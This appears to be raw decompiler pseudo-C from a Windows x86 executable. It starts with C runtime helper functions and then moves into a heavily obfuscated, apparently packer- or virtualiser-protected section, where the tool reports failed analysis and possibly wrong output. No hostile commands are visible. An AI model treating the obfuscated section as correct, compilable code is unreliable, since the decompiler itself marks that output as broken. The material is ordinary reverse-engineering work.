// 41D0A7: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD);
// 41D18A: using guessed type int var_8;

//----- (0041D1B2) --------------------------------------------------------
int __cdecl sub_41D1B2(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(
           &v3,
           a2,
           &v4);
}
// 41D0F2: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD);
// 41D1B2: using guessed type int var_8;

//----- (0041D4B7) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_41D4B7(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_50A02C )
  {
    result = (struct __crt_locale_data *)dword_508AA0;
    if ( (dword_508AA0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 425B76: using guessed type int __acrt_update_thread_locale_data(void);
// 508AA0: using guessed type int dword_508AA0;

//----- (0041D4E4) --------------------------------------------------------
void *__cdecl sub_41D4E4(int a1, void **a2)
{
  void *result; // eax

  result = *a2;
  if ( *a2 != Block )
  {
    result = (void *)dword_508AA0;
    if ( (dword_508AA0 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (void *)__acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 42455B: using guessed type int __acrt_update_thread_multibyte_data(void);
// 508AA0: using guessed type int dword_508AA0;

//----- (0041E307) --------------------------------------------------------
int __cdecl sub_41E307(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(
           &v3,
           a2,
           &v4);
}
// 41E283: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(_DWORD, _DWORD, _DWORD);
// 41E307: using guessed type int var_8;

//----- (0041EC00) --------------------------------------------------------
int __cdecl sub_41EC00(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
           &v3,
           a2,
           &v4);
}
// 41EB7E: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 41EC00: using guessed type int var_8;

//----- (0041EC28) --------------------------------------------------------
int __cdecl sub_41EC28(int a1)
{
  int *v2; // [esp+4h] [ebp-4h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_50A230
      && ((int)lpCriticalSection[a1 >> 6][2 * (a1 & 0x3F) + 1].LockSemaphore & 1) != 0 )
    {
      v2 = &a1;
      return sub_41EC00(a1, (int)&v2);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 50A030: using guessed type LPCRITICAL_SECTION lpCriticalSection[128];
// 50A230: using guessed type int dword_50A230;

//----- (0041EF38) --------------------------------------------------------
int __cdecl sub_41EF38(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(
           &v3,
           a2,
           &v4);
}
// 41EEA0: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD);
// 41EF38: using guessed type int var_8;

//----- (00420B56) --------------------------------------------------------
char sub_420B56()
{
  hHeap = 0;
  return 1;
}

//----- (00421888) --------------------------------------------------------
int __cdecl sub_421888(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(
           &v3,
           a2,
           &v4);
}
// 42182E: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD);
// 421888: using guessed type int var_8;

//----- (004225CA) --------------------------------------------------------
int sub_4225CA()
{
  dword_50A650 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 50A650: using guessed type int dword_50A650;

//----- (00423F9C) --------------------------------------------------------
int __thiscall sub_423F9C(_DWORD **this, void *Block)
{
  int v3; // edi

  v3 = unknown_libname_38();
  if ( v3 )
  {
    _free_base(Block);
    return v3;
  }
  else
  {
    *this[1]++ = Block;
    return 0;
  }
}
// 423FD1: using guessed type int unknown_libname_38(void);

//----- (004240A6) --------------------------------------------------------
int __cdecl sub_4240A6(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 424063: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 4240A6: using guessed type int var_8;

//----- (00426E7A) --------------------------------------------------------
char *__cdecl sub_426E7A(void *Block, unsigned int a2, unsigned int a3)
{
  size_t v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = _msize(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (0042AF34) --------------------------------------------------------
int __cdecl sub_42AF34(double a1)
{
  return _ceil_default(a1);
}

//----- (0042BF50) --------------------------------------------------------
void __cdecl sub_42BF50()
{
  void *v0; // eax

  if ( (unsigned int)dword_500E2C >= 0x10 )
  {
    v0 = dword_500E18;
    if ( (unsigned int)(dword_500E2C + 1) >= 0x1000 )
    {
      if ( (unsigned int)dword_500E18 - *((_DWORD *)dword_500E18 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v0 = (void *)*((_DWORD *)dword_500E18 - 1);
    }
    sub_40FBF3(v0);
  }
  dword_500E28 = 0;
  dword_500E2C = 15;
  LOBYTE(dword_500E18) = 0;
}
// 500E28: using guessed type int dword_500E28;
// 500E2C: using guessed type int dword_500E2C;

//----- (0042BFB0) --------------------------------------------------------
void __cdecl sub_42BFB0()
{
  void *v0; // eax

  if ( (unsigned int)dword_500E44 >= 0x10 )
  {
    v0 = dword_500E30;
    if ( (unsigned int)(dword_500E44 + 1) >= 0x1000 )
    {
      if ( (unsigned int)dword_500E30 - *((_DWORD *)dword_500E30 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v0 = (void *)*((_DWORD *)dword_500E30 - 1);
    }
    sub_40FBF3(v0);
  }
  dword_500E40 = 0;
  dword_500E44 = 15;
  LOBYTE(dword_500E30) = 0;
}
// 500E40: using guessed type int dword_500E40;
// 500E44: using guessed type int dword_500E44;

//----- (0042C006) --------------------------------------------------------
void __cdecl sub_42C006()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_508694, 0xFFFFFFFF) < 0 )
  {
    v0 = &CriticalSection;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&dword_509688 );
  }
}
// 508694: using guessed type signed __int32 dword_508694[3];
// 509688: using guessed type int dword_509688;

//----- (0042C010) --------------------------------------------------------
void __cdecl sub_42C010()
{
  std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t((std::_Fac_tidy_reg_t *)&unk_5096B4);
}

//----- (0042C01A) --------------------------------------------------------
void __cdecl sub_42C01A()
{
  sub_4077E0(&dword_5096AC);
}
// 5096AC: using guessed type _DWORD dword_5096AC;

//----- (0042C024) --------------------------------------------------------
void __cdecl sub_42C024()
{
  _Init_atexit::~_Init_atexit((_Init_atexit *)&unk_509739);
}

//----- (0042C02E) --------------------------------------------------------
void __cdecl sub_42C02E()
{
  struct _RTL_CRITICAL_SECTION *v0; // esi

  if ( _InterlockedExchangeAdd(dword_508694, 0xFFFFFFFF) < 0 )
  {
    v0 = &CriticalSection;
    do
      _Mtxdst(v0++);
    while ( (int)v0 < (int)&dword_509688 );
  }
}
// 508694: using guessed type signed __int32 dword_508694[3];
// 509688: using guessed type int dword_509688;

//----- (0050B134) --------------------------------------------------------
#error "50B137: call analysis failed (funcsize=15)"

//----- (0050B169) --------------------------------------------------------
#error "50B1B3: call analysis failed (funcsize=26)"

//----- (0050B1B8) --------------------------------------------------------
void __usercall sub_50B1B8(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>)
{
  int v8; // eax
  __int16 v9; // dx
  int v10; // [esp-4h] [ebp-4h] BYREF

  v10 = a1;
  *(_DWORD *)(a5 + 4) = a1;
  _EAX = ((int (__cdecl *)(int, int, int, int, int *, int, int, int))sub_50B24A)(a1, a2, a3, a4, &v10, a5, a6, a7);
  __asm { rcl     ah, 7 }
  sub_50B81E(a5, a5);
  sub_50B1D1(v8, v9, a6);
}
// 50B1CD: variable 'v8' is possibly undefined
// 50B1CD: variable 'v9' is possibly undefined
// 50B24A: using guessed type int __cdecl sub_50B24A(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0050B1D1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B1D1(int a1@<eax>, __int16 a2@<dx>, int a3@<edi>)
{
  __getcallerseflags();
  *(_WORD *)(a1 + a3) = a2;
  JUMPOUT(0x50B71E);
}
// 50B1DF: positive sp value 14 has been found
// 50B1DF: control flows out of bounds to 50B71E

//----- (0050B1E4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B1E4(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>)
{
  _DWORD v7[13]; // [esp-34h] [ebp-34h] BYREF
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  if ( (unsigned int)v7 >= 0xFFFFFFCC )
  {
    sub_50C91C(a1, (_DWORD *)(a5 - 4));
    JUMPOUT(0x50B1F6);
  }
  v7[12] = a7;
  v7[11] = a6;
  v7[10] = a5;
  v7[9] = &retaddr;
  v7[8] = a4;
  v7[7] = a3;
  v7[6] = a2;
  sub_50B30A(a1, a5);
}
// 50B1E8: positive sp value 34 has been found
// 50B1F1: control flows out of bounds to 50B1F6

//----- (0050B205) --------------------------------------------------------
void __usercall sub_50B205(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<ebp>, int a5@<edi>, int a6@<esi>)
{
  unsigned int v6; // kr00_4
  unsigned int v7; // kr04_4
  __int64 v8; // rax
  int v9; // ecx
  unsigned int v10; // kr08_4
  int v11; // [esp-Ch] [ebp-50h]
  __int64 v12; // [esp-8h] [ebp-4Ch]
  int v13; // [esp+0h] [ebp-44h]
  _DWORD *v15; // [esp+8h] [ebp-3Ch]
  _DWORD v19[3]; // [esp+18h] [ebp-2Ch] BYREF
  __int64 v20; // [esp+24h] [ebp-20h]
  int v21; // [esp+2Ch] [ebp-18h]
  void **v22; // [esp+34h] [ebp-10h]
  int v23; // [esp+38h] [ebp-Ch]
  int v24; // [esp+3Ch] [ebp-8h]
  int v25; // [esp+40h] [ebp-4h]
  void *retaddr; // [esp+44h] [ebp+0h] BYREF

  *(_DWORD *)(a4 + 4) = a2 & a1;
  v8 = ((__int64 (*)(void))loc_50B980)();
  v24 = a5;
  v22 = &retaddr;
  v21 = v9;
  v20 = v8;
  v10 = __readeflags();
  v19[2] = v10;
  v25 = v8;
  v19[1] = v20;
  v6 = __readeflags();
  v19[0] = v6;
  v15 = v19;
  v13 = v9;
  v12 = v8;
  v11 = v9;
  v7 = __readeflags();
  v23 = a6;
  ((void (__cdecl *)(unsigned int, int, _DWORD, _DWORD, int, int, _DWORD *, int, int, int))sub_50C6DE)(
    v7,
    v11,
    v12,
    HIDWORD(v12),
    v13,
    a3,
    v15,
    a4,
    a5,
    a6);
  JUMPOUT(0x50B5FE);
}
// 50B5F9: control flows out of bounds to 50B5FE
// 50CF02: variable 'v9' is possibly undefined
// 50C6DE: using guessed type _DWORD __cdecl sub_50C6DE(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0050B24F) --------------------------------------------------------
#error "408227: call analysis failed (funcsize=20)"

//----- (0050B285) --------------------------------------------------------
int __cdecl sub_50B285(int a1)
{
  ((void (*)(void))loc_50CACE)();
  return sub_50B28B(a1);
}
// 50B28B: using guessed type _DWORD __cdecl sub_50B28B(_DWORD);

//----- (0050B28B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B28B(char a1@<al>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, int a5@<ebp>, int a6@<edi>, int a7)
{
  char v7; // al
  char v8; // al
  int v9; // eax
  int v12; // edx
  unsigned int v13; // kr04_4
  int v14; // [esp-1Ch] [ebp-38h] BYREF
  void *retaddr; // [esp+1Ch] [ebp+0h] BYREF

  __readeflags();
  v7 = a1 - 1;
  if ( !__OFADD__(56, &v14) )
  {
    sub_50C998(-v7 - 97, a5, a6);
    JUMPOUT(0x50B2B1);
  }
  sub_50B615(v7, a5, a6, v7, a2, a3, a4, (int)&retaddr, a5, a6);
  LOBYTE(v9) = -v8 - 126;
  _BitScanForward(&_DX, a6);
  __asm { rcl     dl, cl }
  v12 = *(_DWORD *)(v9 + a6);
  v13 = __readeflags();
  *(_DWORD *)(a5 - 4) = v12;
  ((void (__cdecl *)(unsigned int, unsigned int, int))sub_50C8C4)(v13, v13, a6);
  JUMPOUT(0x50C795);
}
// 50B29A: positive sp value 2C has been found
// 50B2AC: control flows out of bounds to 50B2B1
// 50C790: control flows out of bounds to 50C795
// 50C75E: variable 'v8' is possibly undefined
// 50C783: variable 'v9' is possibly undefined
// 50C8C4: using guessed type _DWORD sub_50C8C4();

//----- (0050B2BB) --------------------------------------------------------
void sub_50B2BB()
{
  JUMPOUT(0x50B665);
}
// 50B2BE: control flows out of bounds to 50B665

//----- (0050B30A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B30A(int a1@<eax>, int a2@<ebp>)
{
  __readeflags();
  *(_DWORD *)(a2 - 4) = a1;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B328) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B328(unsigned __int16 _CX@<cx>, int a2@<ebp>)
{
  unsigned int v3; // kr08_4
  int v5; // [esp-14h] [ebp-3Ch]
  int v6; // [esp-10h] [ebp-38h]
  int v7; // [esp-Ch] [ebp-34h]
  int v8; // [esp-8h] [ebp-30h]
  int v9; // [esp-4h] [ebp-2Ch]
  int v10; // [esp+0h] [ebp-28h]
  int v11; // [esp+4h] [ebp-24h]
  int v12; // [esp+8h] [ebp-20h]

  __readeflags();
  __readeflags();
  _BitScanForward(&_DX, _CX);
  __asm { rcr     dh, cl }
  v3 = __readeflags();
  _AX = ((int (__stdcall *)(unsigned int, int, int, int, int, int, int, int, int))sub_50CA26)(
          v3,
          v5,
          v6,
          v7,
          v8,
          v9,
          v10,
          v11,
          v12);
  __asm { rcl     al, 1 }
  LOBYTE(_AX) = **(_BYTE **)a2;
  sub_50C88A(_AX, (_WORD *)(a2 + 2));
  sub_50C4A8(*(_DWORD *)(a2 + 2));
  *(_DWORD *)(a2 + 6) = a2 + 2;
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50B366: variable 'v5' is possibly undefined
// 50B366: variable 'v6' is possibly undefined
// 50B366: variable 'v7' is possibly undefined
// 50B366: variable 'v8' is possibly undefined
// 50B366: variable 'v9' is possibly undefined
// 50B366: variable 'v10' is possibly undefined
// 50B366: variable 'v11' is possibly undefined
// 50B366: variable 'v12' is possibly undefined
// 50CA26: using guessed type _DWORD sub_50CA26();

//----- (0050B423) --------------------------------------------------------
void __cdecl sub_50B423(int a1)
{
  int v2; // kr04_4

  __readeflags();
  v2 = __readeflags();
  sub_50CC57(-1739980634, v2);
  sub_4081BA(a1);
}

//----- (0050B43B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_50B43B()
{
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B445) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B445(__int16 a1@<ax>, _WORD *a2@<ebp>, int a3, char a4)
{
  __getcallerseflags();
  *a2 = a1;
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B45F) --------------------------------------------------------
#error "50CE56: call analysis failed (funcsize=14)"

//----- (0050B478) --------------------------------------------------------
void sub_50B478()
{
  _BYTE *v0; // eax
  char v1; // dl

  v0 = (_BYTE *)sub_50B24F(-1511899718);
  __readeflags();
  *v0 = v1;
  __readeflags();
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50B49C: control flows out of bounds to 50B71E
// 50B48F: variable 'v1' is possibly undefined
// 50B24F: using guessed type _DWORD __cdecl sub_50B24F(_DWORD);

//----- (0050B4A1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B4A1(int a1@<eax>, char _CL@<cl>, int a3@<ebp>, int a4@<edi>)
{
  __int16 v4; // sp
  __int16 v5; // dx
  __int16 v7; // [esp-34h] [ebp-3Ch]

  v5 = v4 ^ (v7 | 0x23);
  LOBYTE(a1) = 1 - a1 - 126;
  LOBYTE(v5) = v5 & 0x64;
  _DX = v5 ^ (1 << (a3 & 0xF));
  __asm { rcr     dl, cl }
  __readeflags();
  __readeflags();
  *(_DWORD *)(a3 - 4) = *(_DWORD *)(a1 + a4);
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50B4AC: variable 'v4' is possibly undefined
// 50B4A9: variable 'v7' is possibly undefined

//----- (0050B4F6) --------------------------------------------------------
#error "50B4F6: call analysis failed (funcsize=21)"

//----- (0050B52F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B52F(__int16 a1@<ax>, _WORD *a2@<ebp>)
{
  *a2 = a1;
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B615) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B615(
        int a1@<eax>,
        int a2@<ebp>,
        int a3@<edi>,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10)
{
  __readeflags();
  LOBYTE(a1) = -(char)a1 - 97;
  __readeflags();
  __readeflags();
  *(_WORD *)(a2 - 2) = *(_WORD *)(a1 + a3);
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B659) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B659(int a1@<ebp>)
{
  __int16 v1; // ax

  __readeflags();
  __readeflags();
  sub_50C8D0();
  __readeflags();
  __readeflags();
  *(_DWORD *)(a1 - 4) = v1;
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50C8BD: variable 'v1' is possibly undefined

//----- (0050B677) --------------------------------------------------------
#error "50C5AF: call analysis failed (funcsize=18)"

//----- (0050B6E2) --------------------------------------------------------
void __userpurge sub_50B6E2(
        __int16 a1@<dx>,
        __int16 a2@<bx>,
        int a3@<esi>,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24)
{
  char v24; // of
  char v25; // bl
  int v26; // esi
  char v27; // cf
  char v28; // zf
  char v29; // sf
  int v30; // edx

  v24 = __OFADD__(a1 & ~(1 << (a3 & 0xF)), a2);
  v25 = a3;
  if ( v24 )
    JUMPOUT(0x50CD6E);
  v24 = __OFADD__(a19, a3);
  v26 = a19 + a3;
  if ( v24 )
  {
    __readeflags();
    __readeflags();
    __readeflags();
    __asm { retn    54h ; 'T' }
  }
  __readeflags();
  sub_50C12A();
  sub_50B731(v27, v28, v29, v24, v30, a4, a5, a6, a7, a8, a9, a10, a11);
}
// 50B70E: control flows out of bounds to 50CD6E
// 50B72D: variable 'v27' is possibly undefined
// 50B72D: variable 'v28' is possibly undefined
// 50B72D: variable 'v29' is possibly undefined
// 50B72D: variable 'v24' is possibly undefined
// 50B72D: variable 'v30' is possibly undefined

//----- (0050B731) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B731(
        char _CF@<cf>,
        char _ZF@<zf>,
        char _SF@<sf>,
        char _OF@<of>,
        int a5@<edx>,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13)
{
  __getcallerseflags();
  __readeflags();
  if ( _CF | _ZF )
    __asm { rep pushf }
  else
    __asm { rep pushf }
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50B8D0: positive sp value 1C has been found
// 50B8DF: control flows out of bounds to 50CA61

//----- (0050B75A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B75A(_DWORD *a1@<ebp>, int a2, int a3, int a4)
{
  int v4; // [esp-30h] [ebp-30h]

  *a1 = v4;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50B75E: variable 'v4' is possibly undefined

//----- (0050B784) --------------------------------------------------------
#error "50B788: call analysis failed (funcsize=30)"

//----- (0050B797) --------------------------------------------------------
#error "50BBB9: call analysis failed (funcsize=18)"

//----- (0050B7B6) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50B7B6(char a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  void *v13; // [esp-1Ch] [ebp-2Ch]
  void *retaddr; // [esp+10h] [ebp+0h]

  __readeflags();
  __readeflags();
  __asm { rep pushf }
  retaddr = v13;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50B7EF: positive sp value 18 has been found
// 50B7EF: control flows out of bounds to 50CA61
// 50B7DC: variable 'v13' is possibly undefined

//----- (0050B7F4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50B7F4(int a1, int a2, int a3)
{
  void *v7; // [esp+18h] [ebp-18h]
  void *retaddr; // [esp+30h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v7;
  JUMPOUT(0x50CA61);
}
// 50BAFE: positive sp value 4 has been found
// 50BAFE: control flows out of bounds to 50CA61
// 50BAED: variable 'v7' is possibly undefined

//----- (0050B80D) --------------------------------------------------------
void __usercall sub_50B80D(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>)
{
  sub_50C5CF(a1, a2, a3, a4, a5, a6, a7);
}

//----- (0050B815) --------------------------------------------------------
void __cdecl sub_50B815(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12)
{
  JUMPOUT(0x408191);
}
// 50B819: control flows out of bounds to 408191

//----- (0050B81E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B81E(__int16 a1@<ax>, int a2@<ebp>)
{
  __readeflags();
  __readeflags();
  *(_WORD *)(a2 - 2) = a1;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B882) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50B882(int a1)
{
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 50B893: positive sp value 40 has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050B898) --------------------------------------------------------
void __usercall sub_50B898(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        char a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  ((void (__cdecl *)(int, int, int, int, void **, int, int, int))loc_50C725)(a1, a2, a3, a4, &retaddr, a5, a6, a7);
  sub_50B2BB();
}

//----- (0050B8AE) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50B8AE(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19)
{
  void *v23; // [esp-4Ch] [ebp-50h]
  void *retaddr; // [esp+4h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v23;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50B8BD: positive sp value 4C has been found
// 50B8BD: control flows out of bounds to 50CA61
// 50B8B0: variable 'v23' is possibly undefined

//----- (0050B8C2) --------------------------------------------------------
#error "50B8CB: call analysis failed (funcsize=3)"

//----- (0050B919) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50B919(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13)
{
  void *v17; // [esp-34h] [ebp-3Ch]
  void *retaddr; // [esp+8h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v17;
  JUMPOUT(0x50CA61);
}
// 50B93A: positive sp value 30 has been found
// 50B93A: control flows out of bounds to 50CA61
// 50B924: variable 'v17' is possibly undefined

//----- (0050B957) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50B957(
        char _CF@<cf>,
        char _ZF@<zf>,
        char _SF@<sf>,
        char _OF@<of>,
        int a5,
        int a6,
        __int16 a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        __int16 a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24)
{
  if ( _SF != _OF )
  {
    __readeflags();
    __readeflags();
    __readeflags();
    __asm { rep pushf }
  }
  else
  {
    __asm { rep pushf }
    __readeflags();
  }
